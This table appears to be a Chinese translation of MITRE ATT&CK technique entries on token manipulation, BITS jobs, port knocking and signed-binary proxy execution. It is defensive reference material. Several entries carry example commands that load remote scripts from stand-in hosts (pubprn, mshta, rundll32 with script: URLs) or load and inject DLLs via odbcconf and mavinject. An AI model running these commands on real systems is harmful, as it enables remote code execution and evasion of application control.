| [T1134.001](../techniques/T1134.001.md) | 令牌模拟/盗用 | 对手可能会复制然后模拟其他用户的现有令牌以提升权限并绕过访问控制。例如，对手可以使用 `DuplicateToken` 或 `DuplicateTokenEx` 复制现有令牌。(引用: DuplicateToken function) 然后可以使用 `ImpersonateLoggedOnUser` 允许调用线程模拟已登录用户的安全上下文，或使用 `SetThreadToken` 将模拟的令牌分配给线程。  当对手有特定的现有进程要分配复制的令牌时，可能会执行[令牌模拟/盗用](https://attack.mitre.org/techniques/T1134/001)。例如，当目标用户在系统上有非网络登录会话时，这可能很有用。  当对手使用复制的令牌创建新进程而不是附加到现有进程时，他们还可以使用 `CreateProcessWithTokenW` 或 `CreateProcessAsUserW` [使用令牌创建进程](https://attack.mitre.org/techniques/T1134/002)。[令牌模拟/盗用](https://attack.mitre.org/techniques/T1134/001) 也与[创建和模拟令牌](https://attack.mitre.org/techniques/T1134/003)不同，因为它指的是复制现有令牌，而不是创建新令牌。 |
| [T1134.002](../techniques/T1134.002.md) | 使用令牌创建进程 | 对手可能会使用现有令牌创建新进程，以提升权限并绕过访问控制。可以使用 <code>CreateProcessWithTokenW</code> 和 <code>runas</code> 等功能创建具有另一个用户令牌和结果安全上下文的进程。(引用: Microsoft RunAs)  使用与当前用户不关联的令牌创建进程可能需要目标用户的凭据、模拟该用户的特定权限或访问要使用的令牌。例如，可以通过[令牌模拟/盗用](https://attack.mitre.org/techniques/T1134/001)复制令牌或通过[创建和模拟令牌](https://attack.mitre.org/techniques/T1134/003)创建令牌，然后使用它来创建进程。  虽然此技术与[令牌模拟/盗用](https://attack.mitre.org/techniques/T1134/001)不同，但可以结合使用这些技术，其中令牌被复制，然后用于创建新进程。 |
| [T1134.003](../techniques/T1134.003.md) | 创建和模拟令牌 | 对手可能会创建新令牌并模拟用户以提升权限并绕过访问控制。例如，如果对手有用户名和密码，但用户未登录系统，对手可以使用`LogonUser`函数为用户创建一个登录会话。(引用: LogonUserW function) 该函数将返回新会话的访问令牌副本，对手可以使用`SetThreadToken`将令牌分配给线程。  这种行为与[令牌模拟/盗用](https://attack.mitre.org/techniques/T1134/001)不同，因为这指的是创建新用户令牌，而不是窃取或复制现有的令牌。 |
| [T1134.004](../techniques/T1134.004.md) | 父PID欺骗 | 对手可能会伪造新进程的父进程标识符（PPID），以规避进程监控防御或提升权限。新进程通常直接从其父进程或调用进程生成，除非明确指定。通过<code>CreateProcess</code> API调用显式分配新进程的PPID是一种方法，该调用支持定义要使用的PPID的参数。(引用: DidierStevens SelectMyParent Nov 2009) 此功能由Windows功能（如用户帐户控制（UAC））使用，以在请求的提升进程由SYSTEM（通常通过<code>svchost.exe</code>或<code>consent.exe</code>）生成而不是当前用户上下文时正确设置PPID。(引用: Microsoft UAC Nov 2018)  对手可能会滥用这些机制来规避防御，例如阻止直接从Office文档生成进程的防御，以及针对异常/潜在恶意的父子进程关系的分析，例如将[PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011)的PPID伪装为<code>explorer.exe</code>而不是作为[鱼叉式网络钓鱼附件](https://attack.mitre.org/techniques/T1566/001)的一部分交付的Office文档。(引用: CounterCept PPID Spoofing Dec 2018) 这种欺骗可以通过恶意Office文档中的[Visual Basic](https://attack.mitre.org/techniques/T1059/005)或任何可以执行[本机API](https://attack.mitre.org/techniques/T1106)的代码来执行。(引用: CTD PPID Spoofing Macro Mar 2019)(引用: CounterCept PPID Spoofing Dec 2018)  显式分配PPID还可能在具有适当访问权限的父进程的情况下启用提升的权限。例如，具有特权用户上下文（即管理员）的对手可能会生成一个新进程，并将父进程分配为以SYSTEM身份运行的进程（如<code>lsass.exe</code>），从而通过继承的访问令牌提升新进程的权限。(引用: XPNSec PPID Nov 2017) |
| [T1134.005](../techniques/T1134.005.md) | SID 历史注入 | 对手可能使用 SID 历史注入来提升权限并绕过访问控制。Windows 安全标识符 (SID) 是标识用户或组账户的唯一值。SID 由 Windows 安全性在安全描述符和访问令牌中使用。(引用: Microsoft SID) 账户可以在 SID-History Active Directory 属性中保存其他 SID 值(引用: Microsoft SID-History Attribute)，允许域之间的互操作账户迁移（例如，SID-History 中的所有值都包含在访问令牌中）。  通过域管理员（或等效）权限，可以插入收集到的或众所周知的 SID 值(引用: Microsoft Well Known SIDs Jun 2017) 到 SID-History 中，以便模拟任意用户/组，例如企业管理员。这种操作可能导致对本地资源的提升访问权限和/或通过横向移动技术（如[远程服务](https://attack.mitre.org/techniques/T1021)、[SMB/Windows 管理共享](https://attack.mitre.org/techniques/T1021/002) 或 [Windows 远程管理](https://attack.mitre.org/techniques/T1021/006)）访问其他无法访问的域。 |
| [T1140](../techniques/T1140.md) | 反混淆/解码文件或信息 | 对手可能会使用[混淆文件或信息](https://attack.mitre.org/techniques/T1027)来隐藏入侵的工件。他们可能需要单独的机制来解码或反混淆这些信息，具体取决于他们打算如何使用它。执行此操作的方法包括恶意软件的内置功能或使用系统上存在的实用程序。  一个例子是使用[certutil](https://attack.mitre.org/software/S0160)解码隐藏在证书文件中的远程访问工具可执行文件。(引用: Malwarebytes Targeted Attack against Saudi Arabia) 另一个例子是使用Windows <code>copy /b</code>命令将二进制片段重新组装成恶意有效负载。(引用: Carbon Black Obfuscation Sept 2016)  有时用户的操作可能是打开它以进行反混淆或解密的一部分，例如[用户执行](https://attack.mitre.org/techniques/T1204)。用户还可能需要输入密码以打开对手提供的密码保护的压缩/加密文件。(引用: Volexity PowerDuke November 2016) |
| [T1197](../techniques/T1197.md) | BITS 任务 | 对手可能会滥用 BITS 任务来持续执行代码并执行各种后台任务。Windows 后台智能传输服务 (BITS) 是一种通过 [组件对象模型](https://attack.mitre.org/techniques/T1559/001) (COM) 暴露的低带宽、异步文件传输机制。(引用: Microsoft COM)(引用: Microsoft BITS) BITS 通常用于更新程序、消息传递程序和其他首选在后台运行的应用程序（使用可用的空闲带宽）而不打断其他网络应用程序。文件传输任务作为 BITS 任务实现，其中包含一个或多个文件操作的队列。  创建和管理 BITS 任务的接口可通过 [PowerShell](https://attack.mitre.org/techniques/T1059/001) 和 [BITSAdmin](https://attack.mitre.org/software/S0190) 工具访问。(引用: Microsoft BITS)(引用: Microsoft BITSAdmin)  对手可能会滥用 BITS 下载（例如 [入口工具传输](https://attack.mitre.org/techniques/T1105)）、执行甚至在运行恶意代码后进行清理（例如 [指标移除](https://attack.mitre.org/techniques/T1070)）。BITS 任务是自包含的 BITS 任务数据库，没有新文件或注册表修改，并且通常被主机防火墙允许。(引用: CTU BITS Malware June 2016)(引用: Mondok Windows PiggyBack BITS May 2007)(引用: Symantec BITS May 2007) BITS 启用的执行还可以通过创建长期任务（默认最大寿命为 90 天且可扩展）或在任务完成或出错时调用任意程序（包括系统重启后）来实现持久性。(引用: PaloAlto UBoatRAT Nov 2017)(引用: CTU BITS Malware June 2016)  BITS 上传功能也可用于执行 [通过替代协议外传](https://attack.mitre.org/techniques/T1048)。(引用: CTU BITS Malware June 2016) |
| [T1202](../techniques/T1202.md) | 间接命令执行 | 对手可能会滥用允许命令执行的实用程序，以绕过限制使用命令行解释器的安全限制。各种Windows实用程序可能用于执行命令，可能不调用[cmd](https://attack.mitre.org/software/S0106)。例如，[Forfiles](https://attack.mitre.org/software/S0193)、程序兼容性助手（pcalua.exe）、Windows子系统Linux（WSL）组件、Scriptrunner.exe以及其他实用程序可能会调用程序和命令的执行，来自[命令和脚本解释器](https://attack.mitre.org/techniques/T1059)、运行窗口或通过脚本。(引用: VectorSec ForFiles Aug 2017)(引用: Evi1cg Forfiles Nov 2017)(引用: Secure Team - Scriptrunner.exe)(引用: SS64)(引用: Bleeping Computer - Scriptrunner.exe)  对手可能会滥用这些功能进行[防御规避](https://attack.mitre.org/tactics/TA0005)，特别是执行任意命令，同时规避检测和/或缓解控制（如组策略）限制/防止使用[cmd](https://attack.mitre.org/software/S0106)或更常与恶意有效负载相关的文件扩展名。 |
| [T1205](../techniques/T1205.md) | 流量信号 | 对手可能会使用流量信号来隐藏用于持久性或命令和控制的开放端口或其他恶意功能。流量信号涉及发送一个魔法值或序列到系统以触发特殊响应，例如打开关闭的端口或执行恶意任务。这可能采取发送具有某些特征的一系列数据包的形式，然后端口将被打开供对手使用命令和控制。通常，这些数据包序列包括尝试连接到预定义序列的关闭端口（即[端口敲击](https://attack.mitre.org/techniques/T1205/001)），但也可以涉及不寻常的标志、特定字符串或其他独特特征。在序列完成后，打开端口可以通过基于主机的防火墙实现，但也可以通过自定义软件实现。  对手还可能与已经打开的端口通信，但监听该端口的服务只有在传递适当的魔法值时才会响应命令或触发其他恶意功能。  观察触发通信的信号数据包可以通过不同的方法进行。一种方法，最初由 Cd00r 实现 (引用: Hartrell cd00r 2002)，是使用 libpcap 库来嗅探相关数据包。另一种方法利用原始套接字，使恶意软件能够使用其他程序已经打开的端口。  在网络设备上，对手可能会使用精心制作的数据包来启用[网络设备身份验证](https://attack.mitre.org/techniques/T1556/004)以用于设备提供的标准服务，例如 telnet。此类信号还可以用于打开关闭的服务端口，例如 telnet，或触发恶意软件植入物上的模块修改，添加、删除或更改恶意功能。对手可能会使用精心制作的数据包尝试连接到一个或多个（打开或关闭的）端口，但也可能尝试连接到路由器接口、广播和网络地址 IP 上的相同端口以实现其目标和目的。(引用: Cisco Synful Knock Evolution)(引用: Mandiant - Synful Knock)(引用: Cisco Blog Legacy Device Attacks) 要在嵌入式设备上启用此流量信号，对手必须首先实现并利用[补丁系统映像](https://attack.mitre.org/techniques/T1601/001)，因为架构的单片性质。  对手还可能使用 Wake-on-LAN 功能来打开已关闭的系统。Wake-on-LAN 是一种硬件功能，允许通过发送魔法数据包来打开或唤醒已关闭的系统。一旦系统打开，它可能成为横向移动的目标。(引用: Bleeping Computer - Ryuk WoL)(引用: AMD Magic Packet) |
| [T1205.001](../techniques/T1205.001.md) | 端口敲击 | 对手可能会使用端口敲击来隐藏用于持久性或命令和控制的开放端口。为了启用端口，对手会向一系列预定义的关闭端口发送一系列尝试连接。在完成序列后，通常由主机防火墙打开端口，但也可以由自定义软件实现。  这种技术已被观察到用于动态打开监听端口以及在不同系统上启动与监听服务器的连接。  可以通过不同的方法观察触发通信的信号包。一种方法，最初由 Cd00r 实现 (引用: Hartrell cd00r 2002)，是使用 libpcap 库嗅探相关数据包。另一种方法利用原始套接字，使恶意软件能够使用其他程序已打开的端口。 |
| [T1205.002](../techniques/T1205.002.md) | 套接字过滤器 | 对手可能会将过滤器附加到网络套接字，以监视然后激活用于持久性或命令和控制的后门。具有提升权限的对手可以使用诸如`libpcap`库之类的功能打开套接字并安装过滤器，以允许或禁止某些类型的数据通过套接字。过滤器可能适用于通过指定网络接口（如果未指定，则适用于每个接口）的所有流量。当网络接口接收到与过滤器条件匹配的数据包时，可以在主机上触发其他操作，例如激活反向shell。  为了建立连接，对手会向目标主机发送与安装的过滤器条件匹配的精心制作的数据包。(引用: haking9 libpcap network sniffing) 对手已经使用这些套接字过滤器来触发植入物的安装、进行ping返回以及调用命令shell。与[协议隧道](https://attack.mitre.org/techniques/T1572)结合使用时，这些套接字过滤器的通信也可能被使用。(引用: exatrack bpf filters passive backdoors)(引用: Leonardo Turla Penquin May 2020)  可以在安装了`libpcap`的任何类Unix平台上或在使用`Winpcap`的Windows主机上安装过滤器。对手可以使用`libpcap`与`pcap_setfilter`或标准库函数`setsockopt`与`SO_ATTACH_FILTER`选项。由于套接字连接在接收到数据包之前未激活，因此由于主机上的活动缺乏、CPU开销低以及对原始套接字使用的可见性有限，这种行为可能难以检测。 |
| [T1207](../techniques/T1207.md) | 恶意域控制器 | 对手可能会注册一个恶意域控制器，以便操纵Active Directory数据。DCShadow可能被用来创建一个恶意域控制器（DC）。DCShadow是一种通过注册（或重新使用不活动的注册）并模拟DC的行为来操纵Active Directory（AD）数据（包括对象和架构）的方法。(引用: DCShadow Blog) 一旦注册，恶意DC可能能够将更改注入并复制到AD基础设施中的任何域对象，包括凭据和密钥。  注册恶意DC涉及在AD架构的配置分区中创建新的服务器和nTDSDSA对象，这需要管理员权限（域管理员或本地DC管理员）或KRBTGT哈希。(引用: Adsecurity Mimikatz Guide)  此技术可能绕过系统日志记录和安全监控工具（如安全信息和事件管理（SIEM）产品），因为在恶意DC上执行的操作可能不会报告给这些传感器。(引用: DCShadow Blog) 此技术还可以用于更改和删除复制和其他相关元数据，以阻碍法医分析。对手还可能利用此技术执行[SID历史注入](https://attack.mitre.org/techniques/T1134/005)和/或操纵AD对象（如账户、访问控制列表、架构）以建立持久性后门。(引用: DCShadow Blog) |
| [T1211](../techniques/T1211.md) | 利用漏洞进行防御规避 | 对手可能利用系统或应用程序漏洞来绕过安全功能。漏洞利用发生在对手利用程序、服务或操作系统软件或内核本身中的编程错误来执行对手控制的代码时。漏洞可能存在于防御安全软件中，可以用来禁用或绕过它们。  对手可能通过侦察事先了解环境中存在的安全软件，或者在系统被攻破期间或之后进行检查以进行[安全软件发现](https://attack.mitre.org/techniques/T1518/001)。安全软件可能会被直接针对进行漏洞利用。有例子表明，持久威胁组织针对防病毒软件以避免检测。  也有例子表明，公共云基础设施中的漏洞可能绕过防御边界(引用: Salesforce zero-day in facebook phishing attack)，规避安全日志(引用: Bypassing CloudTrail in AWS Service Catalog)，或部署隐藏基础设施。(引用: GhostToken GCP flaw) |
| [T1216](../techniques/T1216.md) | 系统脚本代理执行 | 对手可能使用受信任的脚本（通常带有证书签名）代理恶意文件的执行。几个从Microsoft下载或在Windows安装中默认存在的Microsoft签名脚本可以用来代理其他文件的执行。(引用: LOLBAS Project) 对手可能滥用这种行为来执行恶意文件，这些文件可能绕过系统上的应用程序控制和签名验证。(引用: GitHub Ultimate AppLocker Bypass List) |
| [T1216.001](../techniques/T1216.001.md) | PubPrn | 对手可能会使用 PubPrn 代理执行恶意远程文件。PubPrn.vbs 是一个 [Visual Basic](https://attack.mitre.org/techniques/T1059/005) 脚本，用于将打印机发布到 Active Directory 域服务。该脚本可能由 Microsoft 签名，通常通过 <code>Cscript.exe</code> 通过 [Windows 命令行](https://attack.mitre.org/techniques/T1059/003) 执行。例如，以下代码在指定域内发布打印机：<code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>。(引用: pubprn)  对手可能会滥用 PubPrn 执行托管在远程站点上的恶意有效负载。(引用: Enigma0x3 PubPrn Bypass) 为此，对手可能会将第二个 <code>script:</code> 参数设置为引用托管在远程站点上的脚本文件 (.sct)。一个示例命令是 <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>。这种行为可能会绕过签名验证限制和不考虑滥用此脚本的应用程序控制解决方案。  在 Windows 的较新版本（10+）中，<code>PubPrn.vbs</code> 已更新以防止代理执行来自远程站点的代码。这是通过将第二个参数中指定的协议限制为 <code>LDAP://</code>，而不是可以通过 HTTP(S) 引用远程代码的 <code>script:</code> 标识符来实现的。 |
| [T1216.002](../techniques/T1216.002.md) | SyncAppvPublishingServer | 攻击者可能滥用SyncAppvPublishingServer.vbs来代理执行恶意的[PowerShell](https://attack.mitre.org/techniques/T1059/001)命令。SyncAppvPublishingServer.vbs是与Windows虚拟化应用程序（Microsoft Application Virtualization，或App-V）相关的Visual Basic脚本。(引用: 1 - appv) 例如，Windows可能将Win32应用程序呈现给用户作为虚拟应用程序，允许用户像本地安装一样启动和与它们交互。(引用: 2 - appv)(引用: 3 - appv)      SyncAppvPublishingServer.vbs脚本是合法的，可能由Microsoft签名，通常通过`wscript.exe`从`\System32`通过命令行执行。(引用: 4 - appv)(引用: 5 - appv)  攻击者可能滥用SyncAppvPublishingServer.vbs来绕过[PowerShell](https://attack.mitre.org/techniques/T1059/001)执行限制，并通过“利用现有资源”规避防御措施。(引用: 6 - appv)(引用: 4 - appv) 代理执行可能作为直接调用`powershell.exe`的受信任/签名的替代方案。(引用: 7 - appv)  例如，可以使用以下方式调用[PowerShell](https://attack.mitre.org/techniques/T1059/001)命令：(引用: 5 - appv)  `SyncAppvPublishingServer.vbs "n; {PowerShell}"` |
| [T1218](../techniques/T1218.md) | 系统二进制代理执行 | 对手可能会通过使用签名的或其他受信任的二进制文件代理执行恶意内容来绕过基于进程和/或签名的防御措施。此技术中使用的二进制文件通常是 Microsoft 签名的文件，表明它们已从 Microsoft 下载或已在操作系统中本地存在。(引用: LOLBAS Project) 使用受信任数字证书签名的二进制文件通常可以在受数字签名验证保护的 Windows 系统上执行。可以使用多个 Microsoft 签名的二进制文件来代理执行其他文件或命令。  类似地，在 Linux 系统上，对手可能会滥用受信任的二进制文件，例如 <code>split</code> 来代理执行恶意命令。(引用: split man page)(引用: GTFO split) |
| [T1218.001](../techniques/T1218.001.md) | 编译HTML文件 | 对手可能滥用编译HTML文件（.chm）来隐藏恶意代码。CHM文件通常作为Microsoft HTML帮助系统的一部分分发。CHM文件是各种内容的压缩编译，例如HTML文档、图像和脚本/网页相关编程语言，如VBA、JScript、Java和ActiveX。(引用: Microsoft HTML Help May 2018) CHM内容使用Internet Explorer浏览器的底层组件显示(引用: Microsoft HTML Help ActiveX)，由HTML帮助可执行程序（hh.exe）加载。(引用: Microsoft HTML Help Executable Program)  自定义CHM文件包含嵌入的有效载荷，可以传递给受害者，然后通过[用户执行](https://attack.mitre.org/techniques/T1204)触发。CHM执行也可能绕过旧版和/或未修补系统上的应用程序控制，这些系统不考虑通过hh.exe执行二进制文件。(引用: MsitPros CHM Aug 2017)(引用: Microsoft CVE-2017-8625 Aug 2017) |
| [T1218.002](../techniques/T1218.002.md) | 控制面板 | 对手可能会滥用control.exe来代理执行恶意有效负载。Windows控制面板进程二进制文件（control.exe）处理控制面板项的执行，这些项是允许用户查看和调整计算机设置的实用程序。  控制面板项是注册的可执行文件（.exe）或控制面板（.cpl）文件，后者实际上是重命名的动态链接库（.dll）文件，导出<code>CPlApplet</code>函数。(引用: Microsoft Implementing CPL)(引用: TrendMicro CPL Malware Jan 2014) 为了便于使用，控制面板项通常包括在注册并加载到控制面板后可供用户使用的图形菜单。(引用: Microsoft Implementing CPL) 控制面板项可以直接从命令行执行，通过应用程序编程接口（API）调用程序化执行，或通过双击文件执行。(引用: Microsoft Implementing CPL) (引用: TrendMicro CPL Malware Jan 2014)(引用: TrendMicro CPL Malware Dec 2013)  恶意控制面板项可以通过[网络钓鱼](https://attack.mitre.org/techniques/T1566)活动传递(引用: TrendMicro CPL Malware Jan 2014)(引用: TrendMicro CPL Malware Dec 2013)或作为多阶段恶意软件的一部分执行。(引用: Palo Alto Reaver Nov 2017) 控制面板项，特别是CPL文件，还可能绕过应用程序和/或文件扩展名允许列表。  对手还可以将恶意DLL文件（.dll）重命名为控制面板文件扩展名（.cpl）并将它们注册到<code>HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls</code>。即使这些注册的DLL不符合CPL文件规范并且不导出<code>CPlApplet</code>函数，它们仍会通过其<code>DllEntryPoint</code>在控制面板执行时加载和执行。不导出<code>CPlApplet</code>的CPL文件不能直接执行。(引用: ESET InvisiMole June 2020) |
| [T1218.003](../techniques/T1218.003.md) | CMSTP | 对手可能会滥用CMSTP来代理执行恶意代码。Microsoft连接管理器配置文件安装程序（CMSTP.exe）是一个命令行程序，用于安装连接管理器服务配置文件。(引用: Microsoft Connection Manager Oct 2009) CMSTP.exe接受安装信息文件（INF）作为参数，并安装用于远程访问连接的服务配置文件。  对手可能会向CMSTP.exe提供感染了恶意命令的INF文件。(引用: Twitter CMSTP Usage Jan 2018) 类似于[Regsvr32](https://attack.mitre.org/techniques/T1218/010) / “Squiblydoo”，CMSTP.exe可能被滥用来加载和执行DLL(引用: MSitPros CMSTP Aug 2017) 和/或来自远程服务器的COM脚本文件（SCT）。(引用: Twitter CMSTP Jan 2018) (引用: GitHub Ultimate AppLocker Bypass List) (引用: Endurant CMSTP July 2018) 由于CMSTP.exe是一个合法的二进制文件，可能由Microsoft签名，因此这种执行也可能绕过AppLocker和其他应用程序控制防御。  CMSTP.exe还可以被滥用来[绕过用户帐户控制](https://attack.mitre.org/techniques/T1548/002)并通过自动提升的COM接口从恶意INF执行任意命令。(引用: MSitPros CMSTP Aug 2017) (引用: GitHub Ultimate AppLocker Bypass List) (引用: Endurant CMSTP July 2018) |
| [T1218.004](../techniques/T1218.004.md) | InstallUtil | 对手可能使用 InstallUtil 通过受信任的 Windows 实用程序代理执行代码。InstallUtil 是一个命令行实用程序，允许通过执行 .NET 二进制文件中指定的特定安装程序组件来安装和卸载资源。(引用: MSDN InstallUtil) InstallUtil 二进制文件也可能由 Microsoft 数字签名，并位于 Windows 系统的 .NET 目录中：<code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> 和 <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>。  InstallUtil 还可以通过使用二进制文件中的属性来绕过应用程序控制，这些属性执行带有 <code>[System.ComponentModel.RunInstaller(true)]</code> 属性的类。(引用: LOLBAS Installutil) |
| [T1218.005](../techniques/T1218.005.md) | Mshta | 对手可能会滥用 mshta.exe 通过受信任的 Windows 实用程序代理执行恶意 .hta 文件和 Javascript 或 VBScript。有几个不同类型的威胁利用 mshta.exe 在初始妥协和代码执行期间。(引用: Cylance Dust Storm) (引用: Red Canary HTA Abuse Part Deux) (引用: FireEye Attacks Leveraging HTA) (引用: Airbus Security Kovter Analysis) (引用: FireEye FIN7 April 2017)  Mshta.exe 是一个执行 Microsoft HTML 应用程序 (HTA) 文件的实用程序。(引用: Wikipedia HTML Application) HTA 是独立应用程序，使用与 Internet Explorer 相同的模型和技术执行，但在浏览器之外。(引用: MSDN HTML Applications)  文件可以通过内联脚本由 mshta.exe 执行：<code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>  它们也可以直接从 URL 执行：<code>mshta http[:]//webserver/payload[.]hta</code>  Mshta.exe 可用于绕过未考虑其潜在滥用的应用程序控制解决方案。由于 mshta.exe 在 Internet Explorer 的安全上下文之外执行，它还绕过了浏览器安全设置。(引用: LOLBAS Mshta) |
| [T1218.007](../techniques/T1218.007.md) | Msiexec | 对手可能会滥用 msiexec.exe 来代理执行恶意有效负载。Msiexec.exe 是 Windows Installer 的命令行实用程序，因此通常与执行安装包 (.msi) 相关联。(引用: Microsoft msiexec) Msiexec.exe 二进制文件也可能由 Microsoft 数字签名。  对手可能会滥用 msiexec.exe 来启动本地或网络可访问的 MSI 文件。Msiexec.exe 还可以执行 DLL。(引用: LOLBAS Msiexec)(引用: TrendMicro Msiexec Feb 2018) 由于它可能被签名并且是 Windows 系统上的本地程序，msiexec.exe 可以用来绕过不考虑其潜在滥用的应用程序控制解决方案。如果启用了 <code>AlwaysInstallElevated</code> 策略，msiexec.exe 执行还可以提升到 SYSTEM 权限。(引用: Microsoft AlwaysInstallElevated 2018) |
| [T1218.008](../techniques/T1218.008.md) | Odbcconf | 对手可能会滥用 odbcconf.exe 代理执行恶意有效负载。Odbcconf.exe 是一个 Windows 实用程序，允许您配置开放数据库连接 (ODBC) 驱动程序和数据源名称。(引用: Microsoft odbcconf.exe) Odbcconf.exe 二进制文件可能由 Microsoft 数字签名。  对手可能会滥用 odbcconf.exe 以绕过未考虑其潜在滥用的应用程序控制解决方案。类似于[Regsvr32](https://attack.mitre.org/techniques/T1218/010)，odbcconf.exe 具有一个 <code>REGSVR</code> 标志，可以被滥用来执行 DLL（例如 <code>odbcconf.exe /S /A &lbrace;REGSVR "C:\Users\Public\file.dll"&rbrace;</code>）。(引用: LOLBAS Odbcconf)(引用: TrendMicro Squiblydoo Aug 2017)(引用: TrendMicro Cobalt Group Nov 2017) |
| [T1218.009](../techniques/T1218.009.md) | Regsvcs/Regasm | 对手可能会滥用Regsvcs和Regasm，通过受信任的Windows实用程序代理执行代码。Regsvcs和Regasm是用于注册.NET [组件对象模型](https://attack.mitre.org/techniques/T1559/001) (COM) 程序集的Windows命令行实用程序。两者都是可能由Microsoft数字签名的二进制文件。(引用: MSDN Regsvcs)(引用: MSDN Regasm)  这两个实用程序可以通过使用二进制文件中的属性来指定在注册或注销之前应运行的代码来绕过应用程序控制：<code>[ComRegisterFunction]</code>或<code>[ComUnregisterFunction]</code>。即使进程在权限不足的情况下运行并且执行失败，带有注册和注销属性的代码也会执行。(引用: LOLBAS Regsvcs)(引用: LOLBAS Regasm) |
| [T1218.010](../techniques/T1218.010.md) | Regsvr32 | 对手可能会滥用Regsvr32.exe来代理执行恶意代码。Regsvr32.exe是一个命令行程序，用于在Windows系统上注册和注销对象链接和嵌入控件，包括动态链接库（DLL）。Regsvr32.exe二进制文件也可能由Microsoft签名。(引用: Microsoft Regsvr32)  恶意使用Regsvr32.exe可能会避免触发安全工具，这些工具可能不会监控regsvr32.exe进程的执行和加载的模块，因为它们被允许列表或Windows使用regsvr32.exe进行正常操作的误报所忽略。Regsvr32.exe还可以使用加载COM脚本的功能来绕过应用程序控制，以用户权限执行DLL。由于Regsvr32.exe支持网络和代理，因此可以通过在调用时传递指向外部Web服务器上的文件的统一资源定位符（URL）来加载脚本。这种方法不会更改注册表，因为COM对象实际上并未注册，只是执行。(引用: LOLBAS Regsvr32) 这种技术变体通常被称为“Squiblydoo”，并已在针对政府的活动中使用。(引用: Carbon Black Squiblydoo Apr 2016)(引用: FireEye Regsvr32 Targeting Mongolian Gov)  Regsvr32.exe还可以用于注册COM对象，通过[组件对象模型劫持](https://attack.mitre.org/techniques/T1546/015)建立持久性。(引用: Carbon Black Squiblydoo Apr 2016) |
| [T1218.011](../techniques/T1218.011.md) | Rundll32 | 对手可能会滥用rundll32.exe来代理执行恶意代码。使用rundll32.exe，而不是直接执行（即[共享模块](https://attack.mitre.org/techniques/T1129)），可能会避免触发安全工具，因为这些工具可能不会监控rundll32.exe进程的执行，因为白名单或正常操作的误报。rundll32.exe通常与执行DLL有效负载相关（例如：<code>rundll32.exe {DLLname, DLLfunction}</code>）。  rundll32.exe还可以用于执行[控制面板](https://attack.mitre.org/techniques/T1218/002)项目文件（.cpl），通过未记录的shell32.dll函数<code>Control_RunDLL</code>和<code>Control_RunDLLAsUser</code>。双击.cpl文件也会导致rundll32.exe执行。(引用: Trend Micro CPL) 例如，[ClickOnce](https://attack.mitre.org/techniques/T1127/002)可以通过Rundll32.exe代理。  rundll32还可以用于执行诸如JavaScript之类的脚本。这可以使用类似于以下的语法完成：<code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code> 这种行为已被Poweliks等恶意软件使用。(引用: This is Security Command Line Confusion)  对手还可能试图通过滥用rundll32.exe加载DLL函数名称的方式来掩盖恶意代码的分析。作为Windows对各种字符集的兼容性支持的一部分，rundll32.exe将在加载指定函数之前首先检查宽/Unicode然后是ANSI字符支持的函数（例如，给定命令<code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>，rundll32.exe将首先尝试执行<code>ExampleFunctionW</code>，如果失败则<code>ExampleFunctionA</code>，然后加载<code>ExampleFunction</code>）。因此，对手可能通过创建多个相同的导出函数名称并将<code>W</code>和/或<code>A</code>附加到无害的名称上来掩盖恶意代码。(引用: Attackify Rundll32.exe Obscurity)(引用: Github NoRunDll) DLL函数也可以通过序号导出并执行（例如：<code>rundll32.exe file.dll,#1</code>）。  此外，对手可能会使用[伪装](https://attack.mitre.org/techniques/T1036)技术（例如更改DLL文件名、文件扩展名或函数名）进一步隐藏恶意有效负载的执行。(引用: rundll32.exe defense evasion) |
| [T1218.012](../techniques/T1218.012.md) | Verclsid | 对手可能会滥用 verclsid.exe 代理执行恶意代码。Verclsid.exe 被称为扩展 CLSID 验证主机，负责在 Windows 资源管理器或 Windows Shell 使用之前验证每个 shell 扩展。(引用: WinOSBite verclsid.exe)  对手可能会滥用 verclsid.exe 执行恶意有效载荷。这可以通过运行<code>verclsid.exe /S /C {CLSID}</code>来实现，其中文件由类 ID (CLSID) 引用，CLSID 是用于标识 COM 对象的唯一标识号。由 verclsid.exe 执行的 COM 有效载荷可能能够执行各种恶意操作，例如从远程服务器加载和执行 COM 脚本（类似于[Regsvr32](https://attack.mitre.org/techniques/T1218/010)）。由于二进制文件可能已签名和/或本机存在于 Windows 系统上，通过 verclsid.exe 代理执行可能会绕过未考虑其潜在滥用的应用程序控制解决方案。(引用: LOLBAS Verclsid)(引用: Red Canary Verclsid.exe)(引用: BOHOPS Abusing the COM Registry)(引用: Nick Tyrer GitHub) |
| [T1218.013](../techniques/T1218.013.md) | Mavinject | 对手可能会滥用 mavinject.exe 来代理执行恶意代码。Mavinject.exe 是 Microsoft 应用程序虚拟化注入器，是一种 Windows 实用程序，可以作为 Microsoft 应用程序虚拟化 (App-V) 的一部分将代码注入外部进程。(引用: LOLBAS Mavinject)  对手可能会滥用 mavinject.exe 将恶意 DLL 注入正在运行的进程（即[动态链接库注入](https://attack.mitre.org/techniques/T1055/001)），允许任意代码执行（例如 <code>C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>）。(引用: ATT Lazarus TTP Evolution)(引用: Reaqta Mavinject) 由于 mavinject.exe 可能由 Microsoft 数字签名，通过这种方法代理执行可能会逃避安全产品的检测，因为执行被掩盖在合法进程下。  除了[动态链接库注入](https://attack.mitre.org/techniques/T1055/001)外，Mavinject.exe 还可以通过其 <code>/HMODULE</code> 命令行参数执行导入描述符注入（例如 <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>）。此命令将注入由指定 DLL 组成的导入表条目到给定基地址的模块中。(引用: Mavinject Functionality Deconstructed) |
